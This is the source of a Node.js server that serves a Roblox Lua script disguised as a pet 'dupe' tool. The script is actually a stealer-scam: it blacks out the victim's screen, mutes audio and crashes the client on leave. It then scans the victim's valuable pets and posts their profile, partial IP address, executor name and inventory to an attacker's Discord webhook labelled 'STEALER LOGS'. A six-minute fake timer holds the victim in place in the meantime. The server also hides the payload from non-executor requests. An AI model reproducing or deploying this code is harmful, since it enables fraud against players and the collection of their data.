// server.js
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// ------------------------------------------------------------------
// 1. BLOCK EVERYTHING EXCEPT REAL ROBLOX EXECUTORS
// ------------------------------------------------------------------
function blockNonExecutor(req, res, next) {
  const ua   = (req.get("User-Agent") || "").toLowerCase();
  const ref  = (req.get("Referer")   || "").toLowerCase();
  const exec = req.query.executor === "true";

  const allowed =
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ref.includes("roblox.com") ||
    exec;

  if (!allowed) {
    return res.status(403).send(`
<!DOCTYPE html><html><head><title>ACCESS DENIED</title>
<style>body{background:#000;color:#f33;font-family:monospace;text-align:center;padding:80px;}
h1{font-size:3rem;}p{font-size:1.4rem;}</style></head>
<body><h1>ACCESS DENIED</h1>
<p>Only <strong>Roblox executors</strong> may request this endpoint.</p>
</body></html>
    `.trim());
  }
  next();
}

// ------------------------------------------------------------------
// 2. HOME PAGE – just a friendly note
// ------------------------------------------------------------------
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html><html><head><title>Dupe Panel</title>
<style>body{background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:15vh;}</style>
</head><body>
<h1>Dupe Panel</h1>
<p>Use <code>.panel</code> in Discord to get your private loadstring.</p>
</body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 3. /raw – ONLY EXECUTORS → returns the full Lua with the webhook
// ------------------------------------------------------------------
app.get("/raw", blockNonExecutor, (req, res) => {
  const { webhook, pslink } = req.query;

  if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK --");
  }

  // ----------------------------------------------------------------
  //   FULL LUA SCRIPT (identical for everyone except the webhook)
  // ----------------------------------------------------------------
  const lua = `local WebhookURL = "${webhook}"

-- Wait for player
local player = game.Players.LocalPlayer
if not player then
    player = game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
end

-- Crash on leave
game:GetService("CoreGui").ChildRemoved:Connect(function() while true do end end)
game:GetService("RunService").RenderStepped:Connect(function() if not game:GetService("CoreGui") then while true do end end end)

-- Censored IP
local function getIPAddress()
    local real = "Unknown"
    pcall(function()
        if syn and syn.request then
            local r = syn.request({Url="http://httpbin.org/ip",Method="GET"})
            if r and r.Body then
                local d = game:GetService("HttpService"):JSONDecode(r.Body)
                real = d.origin
            end
        end
    end)
    if real ~= "Unknown" then
        local p = {}
        for n in string.gmatch(real,"%d+") do table.insert(p,n) end
        if #p>=4 then return p[1].."."..p[2]..".xxx.xxx" end
    end
    return "192.168.xxx.xxx"
end

-- Executor name
local function getExecutor()
    if syn then return "Synapse X" end
    if PROTOSMASHER_LOADED then return "ProtoSmasher" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    return "Unknown"
end

local playerProfile = "https://www.roblox.com/users/"..player.UserId.."/profile"
local playerAvatar  = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
local playerName    = player.Name

local function getDeviceType()
    return game:GetService("UserInputService").TouchEnabled and "Mobile" or "Computer"
end

-- Black screen + timer
local function createBlackScreen()
    pcall(function() for _,g in pairs(player.PlayerGui:GetChildren()) do g:Destroy() end end)
    local sg = Instance.new("ScreenGui"); sg.Name="FullBlackScreen"; sg.DisplayOrder=999999; sg.ResetOnSpawn=false; sg.ZIndexBehavior=Enum.ZIndexBehavior.Global; sg.Parent=player.PlayerGui
    local f  = Instance.new("Frame"); f.Size=UDim2.new(2,0,2,0); f.Position=UDim2.new(-0.5,0,-0.5,0); f.BackgroundColor3=Color3.new(); f.BorderSizePixel=0; f.ZIndex=999999; f.Parent=sg
    local tl = Instance.new("TextLabel"); tl.Size=UDim2.new(1,0,0,80); tl.Position=UDim2.new(0,0,0.4,0); tl.BackgroundTransparency=1; tl.Text="06:00"; tl.TextColor3=Color3.fromRGB(0,255,255); tl.TextSize=48; tl.Font=Enum.Font.GothamBold; tl.ZIndex=1000000; tl.Parent=f
    local sl = Instance.new("TextLabel"); sl.Size=UDim2.new(1,0,0,25); sl.Position=UDim2.new(0,0,0.55,0); sl.BackgroundTransparency=1; sl.Text="Processing..."; sl.TextColor3=Color3.new(1,1,1); sl.TextSize=18; sl.Font=Enum.Font.Gotham; sl.ZIndex=1000000; sl.Parent=f
    return sg,tl,sl
end

local function disableAllSounds()
    pcall(function()
        local ss = game:GetService("SoundService")
        for i=1,20 do pcall(function() ss.Volume=0 end) end
        for i=1,5 do for _,s in pairs(game:GetDescendants()) do if s:IsA("Sound") then pcall(function() s.Volume=0 s:Stop() end) end end end
    end)
end

local function SendToDiscord(e)
    pcall(function()
        local http = game:GetService("HttpService")
        local body = http:JSONEncode({embeds={e}})
        if syn and syn.request then
            syn.request({Url=WebhookURL,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
        end
    end)
end

local function getMoneyPerSecond(t)
    if not t then return 0 end
    local pats = {"(%d+%.?%d*)B/s","(%d+%.?%d*)M/s","(%d+%.?%d*)K/s","%$(%d+)/s"}
    for _,p in ipairs(pats) do
        local m = string.match(t,p)
        if m then
            local v = tonumber(m)
            if p:find("B/s") then return v*1e9
            elseif p:find("M/s") then return v*1e6
            elseif p:find("K/s") then return v*1e3
            else return v end
        end
    end
    return 0
end

local function scanAllPetsQuick()
    local all,brain,best={},{},{}
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if plots then
            for _,plot in pairs(plots:GetChildren()) do
                local ap = plot:FindFirstChild("AnimalPodiums")
                if ap then
                    for _,pod in pairs(ap:GetChildren()) do
                        local base = pod:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local att = spawn:FindFirstChild("Attachment")
                                if att then
                                    local oh = att:FindFirstChild("AnimalOverhead")
                                    if oh then
                                        local dn = oh:FindFirstChild("DisplayName")
                                        local gen = oh:FindFirstChild("Generation")
                                        if dn and dn:IsA("TextLabel") then
                                            local name = dn.Text
                                            local rate = gen and gen:IsA("TextLabel") and gen.Text or "N/A"
                                            local money = getMoneyPerSecond(rate)
                                            if name~="" then
                                                local pet={Name=name,Rate=rate,MoneyPerSec=money}
                                                table.insert(all,pet)
                                                if string.find(string.lower(name),"brainrot") and money>1e6 then table.insert(brain,pet) end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    table.sort(all,function(a,b) return a.MoneyPerSec>b.MoneyPerSec end)
    table.sort(brain,function(a,b) return a.MoneyPerSec>b.MoneyPerSec end)
    for i=1,math.min(5,#all) do if all[i].MoneyPerSec>0 then table.insert(best,all[i]) end end
    return all,brain,best
end

local function fmtMoney(v)
    if v>=1e9 then return string.format("$%.2fB/s",v/1e9)
    elseif v>=1e6 then return string.format("$%.2fM/s",v/1e6)
    elseif v>=1e3 then return string.format("$%.2fK/s",v/1e3)
    else return string.format("$%d/s",v) end
end

local function fmtPetList(p,show)
    if #p==0 then return "None" end
    local s=""
    for i=1,math.min(5,#p) do
        s=s..string.format("%d. %s | %s\\n",i,p[i].Name,show and fmtMoney(p[i].MoneyPerSec) or p[i].Rate)
    end
    return s
end

local function isLegit(brain,best)
    if #brain>2 then return "LEGIT HIT - Multiple brainrots" end
    if #best>0 and best[1].MoneyPerSec>5e7 then return "LEGIT HIT - High value" end
    if #brain>0 then return "POTENTIAL HIT - Some brainrots" end
    return "LOW VALUE - Nothing good"
end

local function startDupeProcess(psLink)
    local exec = getExecutor()
    local ip   = getIPAddress()
    local dev  = getDeviceType()
    local pc   = #game.Players:GetPlayers()

    local bs,tl,sl = createBlackScreen()
    disableAllSounds()

    local all,brain,best = scanAllPetsQuick()
    local hit = isLegit(brain,best)

    local embed = {
        title="STEALER LOGS",
        description="Private Server: "..(psLink or "Not provided"),
        color=16711680,
        author={name=playerName,icon_url=playerAvatar,url=playerProfile},
        fields={
            {name="USER INFO",value="Executor: "..exec.."\\nIP: "..ip.."\\nDevice: "..dev.."\\nProfile: [Link]("..playerProfile..")",inline=false},
            {name="SERVER INFO",value="Players: "..pc.."\\nTotal Pets: "..#all.."\\nBrainrots: "..#brain,inline=false},
            {name="TOP 5 PETS",value=fmtPetList(best,true),inline=false},
            {name="BRAINROTS",value=fmtPetList(brain,true),inline=false},
            {name="HIT STATUS",value=hit,inline=false}
        },
        footer={text="Stealer Logs • "..os.date("%X")},
        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    SendToDiscord(embed)

    sl.Text="Logs sent! Timer starting..."
    local total=360 local start=tick()
    while tick()-start<total do
        local left=total-(tick()-start)
        local m=math.floor(left/60) local s=math.floor(left%60)
        tl.Text=string.format("%02d:%02d",m,s)
        wait(0.1)
    end

    SendToDiscord({
        title="DUPE PROCESS COMPLETE",
        color=65280,
        author={name=playerName,icon_url=playerAvatar,url=playerProfile},
        fields={{name="RESULTS",value="Time: 6 min\\nPets Duped: "..#all.."\\nBrainrots: "..#brain.."\\nStatus: "..hit,inline=false}},
        footer={text="Stealer Logs • "..os.date("%X")}
    })

    sl.Text="Complete!"; tl.Text="DONE!"
    wait(3); bs:Destroy()
end

local function createPSInputGUI()
    local sg = Instance.new("ScreenGui"); sg.Name="DupeScannerGUI"; sg.ResetOnSpawn=false; sg.Parent=player.PlayerGui
    local mf = Instance.new("Frame"); mf.Size=UDim2.new(0,350,0,200); mf.Position=UDim2.new(0.5,-175,0.5,-100); mf.BackgroundColor3=Color3.new(); mf.Parent=sg
    local title = Instance.new("TextLabel"); title.Size=UDim2.new(1,0,0,50); title.BackgroundColor3=Color3.new(); title.Text="GRAB THE BRAINROT YOU WANNA DUPE"; title.TextColor3=Color3.fromRGB(255,0,0); title.Font=Enum.Font.GothamBold; title.Parent=mf
    local tb = Instance.new("TextBox"); tb.Size=UDim2.new(0.8,0,0,35); tb.Position=UDim2.new(0.1,0,0.3,0); tb.BackgroundColor3=Color3.fromRGB(20,20,20); tb.TextColor3=Color3.new(1,1,1); tb.PlaceholderText="Paste any Roblox link..."; tb.Parent=mf
    local btn = Instance.new("TextButton"); btn.Size=UDim2.new(0.7,0,0,45); btn.Position=UDim2.new(0.15,0,0.7,0); btn.BackgroundColor3=Color3.fromRGB(200,0,0); btn.Text="START DUPE"; btn.TextColor3=Color3.new(1,1,1); btn.Font=Enum.Font.GothamBold; btn.Parent=mf
    btn.MouseButton1Click:Connect(function()
        local link = tb.Text
        if string.find(string.lower(link or ""),"roblox") then
            btn.Text="STARTING..."; btn.BackgroundColor3=Color3.fromRGB(100,0,0)
            startDupeProcess(link)
        end
    end)
end

createPSInputGUI()
`;

  res.type("text/plain").send(lua);
});

// ------------------------------------------------------------------
// 4. START SERVER
// ------------------------------------------------------------------
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`   /raw  → executor only`);
  console.log(`   /     → info page`);
});
